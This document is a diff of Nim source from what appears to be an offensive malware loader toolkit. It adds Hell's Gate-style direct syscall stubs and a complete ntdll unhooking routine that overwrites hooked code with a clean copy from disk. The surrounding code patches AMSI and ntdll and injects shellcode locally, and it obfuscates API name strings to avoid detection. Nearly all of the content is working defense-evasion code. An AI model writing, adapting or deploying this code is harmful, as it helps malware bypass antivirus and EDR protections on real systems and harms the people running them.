@@ -52,6 +52,113 @@ proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectA
 
 """
 
+let HellsgateNtCloseDelegate*  = """
+
+
+proc NtClose(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall`
+        syscall
+        ret
+    ===
+
+"""
+
+let HellsgateUnhookStub * = """
+
+from winim import MODULEINFO, GetModuleInformation
+
+proc ntdllunhook(): bool =
+  let low: uint16 = 0
+  var 
+      processH = GetCurrentProcess()
+      mi : MODULEINFO
+      ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
+      ntdllBase : LPVOID
+      ntdllFile : FileHandle
+      ntdllMapping : HANDLE
+      ntdllMappingAddress : LPVOID
+      hookedDosHeader : PIMAGE_DOS_HEADER
+      hookedNtHeader : PIMAGE_NT_HEADERS
+      hookedSectionHeader : PIMAGE_SECTION_HEADER
+
+  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+  ntdllBase = mi.lpBaseOfDll
+  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
+  ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+  if ntdllMapping == 0:
+    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
+    return false
+  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+  if ntdllMappingAddress.isNil:
+    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
+    return false
+  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
+  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
+  var status = 0
+       
+  var 
+    ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
+    ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
+
+  var 
+    ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
+    ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
+
+  var 
+    ntClosefuncHash        : uint64            = djb2_hash(obf("NtClose"))
+    ntCloseTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntClosefuncHash)
+
+  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
+      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
+      if ".text" in toString(hookedSectionHeader.Name):
+          var oldProtection: DWORD = 0
+          var oldProtection2: DWORD = 0
+          var bytesWritten: SIZE_T
+          var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
+          var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
+          if getSyscall(ntProtectTable):              
+            syscall = ntProtectTable.wSysCall
+          else:
+            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x40, &oldProtection)
+          if status != 0:
+            echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
+            return false
+          if getSyscall(ntWriteTable):
+            syscall = ntWriteTable.wSysCall
+          else:
+            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+          status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
+          if status != 0:
+            echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{GetLastError()}."
+            return false
+          if getSyscall(ntProtectTable):              
+            syscall = ntProtectTable.wSysCall
+          else:
+            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+          status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
+          if status != 0:
+            echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
+            return false
+  if getSyscall(ntCloseTable):              
+    syscall = ntCloseTable.wSysCall
+  else:
+    echo obf("[-] Failed to find opcode for NtClose")
+  status = NtClose(processH)
+  status = NtClose(ntdllFile)
+  status = NtClose(ntdllMapping)
+  FreeLibrary(ntdllModule)
+  return true
+
+
+when isMainModule:
+  var result = ntdllunhook()
+  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"
+
+"""
+
 let HellsgateLocalInjectStub*  = """
                 
 
@@ -63,7 +170,7 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
         var pHandle: HANDLE = getCurrentProcess()
         
         var 
-            ntAllocfuncHash        : uint64            = djb2_hash("NtAllocateVirtualMemory")
+            ntAllocfuncHash        : uint64            = djb2_hash(obf("NtAllocateVirtualMemory"))
             ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
             status          : NTSTATUS          = 0x00000000
             buffer          : LPVOID
@@ -83,7 +190,7 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
             echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
         var 
-            ntWritefuncHash        : uint64            = djb2_hash("NtWriteVirtualMemory")
+            ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
             ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
             bytesWritten: SIZE_T
 
@@ -144,7 +251,7 @@ proc PatchAmsi(): bool =
     var pHandle: HANDLE = getCurrentProcess()
         
     var 
-        ntProtectfuncHash        : uint64            = djb2_hash("NtProtectVirtualMemory")
+        ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
         ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
         status          : NTSTATUS          = 0x00000000
         buffer          : LPVOID
@@ -163,7 +270,7 @@ proc PatchAmsi(): bool =
         echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
 
     var 
-        ntWritefuncHash        : uint64            = djb2_hash("NtWriteVirtualMemory")
+        ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
         ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
         bytesWritten: SIZE_T
 
@@ -241,7 +348,7 @@ proc Patchntdll(): bool =
     var pHandle: HANDLE = getCurrentProcess()
         
     var 
-        ntProtectfuncHash        : uint64            = djb2_hash("NtProtectVirtualMemory")
+        ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
         ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
         status          : NTSTATUS          = 0x00000000
         buffer          : LPVOID
@@ -260,7 +367,7 @@ proc Patchntdll(): bool =
         echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
 
     var 
-        ntWritefuncHash        : uint64            = djb2_hash("NtWriteVirtualMemory")
+        ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
         ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
         bytesWritten: SIZE_T
 
